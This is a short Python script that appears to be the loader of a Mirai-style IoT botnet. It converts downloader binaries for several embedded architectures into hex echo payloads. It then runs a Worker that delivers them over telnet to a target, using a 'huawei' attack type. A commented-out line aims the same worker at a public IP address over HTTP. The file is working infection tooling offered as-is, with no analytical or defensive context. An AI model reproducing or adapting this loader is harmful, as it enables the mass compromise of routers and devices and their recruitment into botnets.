from worker import Worker


BINARY_BYTES_PER_ECHOLINE = 128
arch_payload_list = []


def load_binary_to_payloads(filename):
    hex_payloads = []
    with open(filename, "rb") as f:
        while True:
            payload = ""
            buff = bytearray(f.read(BINARY_BYTES_PER_ECHOLINE))
            for i in range(len(buff)):
                payload += "\\x" + str(hex(buff[i]))[2:]
            hex_payloads.append(payload)
            if len(payload) == 0:
                return hex_payloads


def get_payload_cb(arch):
    for a in arch_payload_list:
        if a[0] == arch:
            return a[1]
    return None


def main():
    # Import dlr
    arch_support_list = ["arm", "arm7", "m68k", "mips", "mpsl", "ppc", "sh4", "spc"]
    # arch_support_list = ["x86"]
    for arch in arch_support_list:
        # Load binary to payloads
        print("{} is loading ...".format(arch))
        ret_payloads = load_binary_to_payloads("bins/dlr.{}".format(arch))
        arch_payload_list.append((arch, ret_payloads))

    print("Load binary done")

    # Attack_type = ["huawei", "myvmware"]
    # cnddt_wkr = Worker("199.195.200.242", 80, "uc_http", get_payload_cb)
    cnddt_wkr = Worker("192.168.2.100", 23, "huawei", get_payload_cb)
    cnddt_wkr.run()
    print("Worker is running")

    # TODO: Main loop
    # while True:
    #     # TODO: Get attack info from stdin ()
    #     # Create thread handle
    #     cnddt_wkr = Worker("127.0.0.1", 7777, "Huawei", get_payload_cb)


if __name__ == "__main__":
    main()

